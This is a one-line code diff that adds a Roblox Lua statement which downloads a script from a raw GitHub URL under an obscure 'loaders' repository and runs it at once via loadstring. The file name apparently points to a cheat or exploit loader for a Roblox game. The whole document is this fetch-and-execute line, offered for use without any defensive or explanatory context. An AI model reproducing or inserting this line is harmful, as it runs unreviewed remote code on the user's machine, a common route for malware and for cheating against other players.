@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/x5-exp-event-sans-aus-fighter-2-spam7-ul9ya401o87t58.lua"))()
